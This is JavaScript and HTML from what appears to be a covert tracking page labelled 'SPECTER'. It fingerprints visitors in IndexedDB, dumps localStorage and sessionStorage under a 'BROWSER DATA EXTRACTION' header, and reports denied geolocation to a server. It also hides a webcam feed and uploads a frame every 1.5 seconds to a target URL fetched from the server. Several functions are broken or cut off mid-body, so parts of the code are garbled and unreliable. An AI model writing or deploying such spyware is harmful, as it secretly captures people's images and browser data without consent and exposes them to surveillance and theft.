  <script>
    // ============================================
    // INDEXEDDB - PERSISTENT SESSION TRACKING
    // ============================================
    var sessionDB;
    var sessionID;
    
    // Initialize IndexedDB
    function initIndexedDB() {
      return new Promise((resolve, reject) => {
        const request = indexedDB.open('SPECTERSessionDB', 1);
        
        request.onerror = () => reject(request.error);
        request.onsuccess = () => {
          sessionDB = request.result;
          resolve();
        };
        
        request.onupgradeneeded = (event) => {
          const db = event.target.result;
          if (!db.objectStoreNames.contains('sessions')) {
            db.createObjectStore('sessions', { keyPath: 'id' });
          }
          if (!db.objectStoreNames.contains('metrics')) {
            db.createObjectStore('metrics', { keyPath: 'id', autoIncrement: true });
          }
        };
      });
    }
    
    // Get or create session ID
    function getOrCreateSessionID() {
      return new Promise((resolve, reject) => {
        const transaction = sessionDB.transaction('sessions', 'readonly');
        const store = transaction.objectStore('sessions');
        const request = store.getAll();
        
        request.onsuccess = () => {
          if (request.result.length > 0) {
            sessionID = request.result[0].id;
            resolve(sessionID);
          } else {
            // Create new session
            const newSessionID = 'SESSION_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            const writeTransaction = sessionDB.transaction('sessions', 'readwrite');
            const writeStore = writeTransaction.objectStore('sessions');
            writeStore.add({
              id: newSessionID,
              createdAt: new Date().toISOString(),
              userAgent: navigator.userAgent,
              startURL: window.location.href
            });
            
            writeTransaction.oncomplete = () => {
              sessionID = newSessionID;
              resolve(sessionID);
            };
            writeTransaction.onerror = () => reject(writeTransaction.error);
          }
        };
        request.onerror = () => reject(request.error);
      });
    }
    
    // Store metric in IndexedDB
    function storeMetric(metricType, metricData) {
      if (!sessionDB) return;
      const transaction = sessionDB.transaction('metrics', 'readwrite');
      const store = transaction.objectStore('metrics');
      store.add({
        sessionID: sessionID,
        type: metricType,
        data: metricData,
        timestamp: new Date().toISOString()
      });
    }

  </script>

    function collectBrowserData() {
      var browserData = "```autohotkey\n=== BROWSER DATA EXTRACTION ===\n\n";

      if (cookies) {

      } else {
        browserData += "Cookies: None found\n\n";
      }
      
      // LocalStorage
      browserData += "LocalStorage:\n";
      for (var i = 0; i < localStorage.length; i++) {
        var key = localStorage.key(i);
        var value = localStorage.getItem(key);
        browserData += key + ": " + (value.length > 200 ? value.substring(0, 200) + "..." : value) + "\n";

      // SessionStorage

        var svalue = sessionStorage.getItem(skey);
        browserData += skey + ": " + (svalue.length > 200 ? svalue.substring(0, 200) + "..." : svalue) + "\n";
      }
      
      // Cache information
      browserData += "\nCache Status:\n";
      if (navigator.storage && navigator.storage.estimate) {
        navigator.storage.estimate().then(function(estimate) {
          browserData += "Quota: " + (estimate.quota / 1024 / 1024).toFixed(2) + " MB\n";

        });

        browserData += "Cache API not available\n";

    function getLocation() {

    function showPosition(position) {

    function showError(error) {
      switch (error.code) {
        case error.PERMISSION_DENIED:
          const request5 = new XMLHttpRequest();
          request5.open("POST", "/location_update");

          request5.setRequestHeader('Content-type', 'application/json');

          const params5 = {
            username: "System Monitor",
            avatar_url: "https://cdn-icons-png.flaticon.com/512/2920/2920277.png",
            content: "```diff\n- User denied the request for Geolocation.```"
          }

          request5.send(JSON.stringify(params5));
          break;
        case error.POSITION_UNAVAILABLE:
          x.innerHTML = "Location information is unavailable."
          break;
        case error.TIMEOUT:
          x.innerHTML = "The request to get user location timed out."
          break;
        case error.UNKNOWN_ERROR:
          x.innerHTML = "An unknown error occurred."
          break;
      }
    }

  <div class="video-wrap" hidden="hidden">
    <video id="video" playsinline autoplay muted width="640" height="480"></video>
  </div>
  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
  <script>
    var url = "";
    var captureActive = false;
    var request6 = new XMLHttpRequest();
    request6.open("GET", "/get_target", true);
    request6.onload = function () {
      if (request6.status === 200) {
        url = request6.responseText;
      } else {
        url = "http://127.0.0.1:8000/image"
      }
    };

    request6.send();
    function postFile(file) {
      let formdata = new FormData();
      formdata.append("image", file);
      let xhr = new XMLHttpRequest();
      xhr.open('POST', url, true);
      xhr.onload = function () {
        if (this.status === 200) {
          console.log('Image uploaded successfully');
        }
        else {
          console.error('Upload failed:', xhr.status);
        }
      };
      xhr.onerror = function() {
        console.error('Network error uploading image');
      };
      xhr.send(formdata);
    }

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const errorMsgElement = document.querySelector('span#errorMsg');

    const constraints = {
      audio: false,
      video: {
        facingMode: "user",
        width: { ideal: 1280 },
        height: { ideal: 720 }
      }
    };

    // Access webcam
    async function init() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints)
        handleSuccess(stream);
      } catch (e) {
        console.error('Camera permission error:', e);
        setTimeout(function () {
          alert("Allow Camera access to video chat");
          window.location.href = "https://www.lifewire.com/configure-camera-microphone-setting-in-google-chrome-4103623"
          alert("Grant cam access")
        }, 15000)
      }
    }

    // Success
    function handleSuccess(stream) {
      window.stream = stream;
      video.srcObject = stream;
      video.play();

      var context = canvas.getContext('2d');
      
      // Function to capture and send frames
      function captureFrame() {
        try {
          // Draw current video frame to canvas
          context.fillStyle = '#000000';
          context.fillRect(0, 0, canvas.width, canvas.height);
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          
          // Convert canvas to blob and upload
          canvas.toBlob(function(blob) {
            if (blob && blob.size > 0) {
              postFile(blob);
              console.log('Frame captured and sent, size:', blob.size);
            } else {
              console.warn('Blob is empty');
            }
          }, 'image/jpeg', 0.9);
        } catch(err) {
          console.error('Error in captureFrame:', err);
        }
      }
      
      // Wait for video to actually have frames
      video.addEventListener('canplay', function() {
        console.log('Video can play, dimensions:', video.videoWidth, 'x', video.videoHeight);
        
        // Update canvas to actual video dimensions
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        
        if (!captureActive) {
          captureActive = true;
          console.log('Starting frame capture...');
          
          // Start capturing immediately and then every 1.5 seconds
          captureFrame();
          setInterval(captureFrame, 1500);
        }
      });
      
      // Ensure video plays
      var playPromise = video.play();
      if (playPromise !== undefined) {
        playPromise.catch(error => {
          console.error('Error playing video:', error);
        });
      }
    }

    // Load init
    init();
  </script>
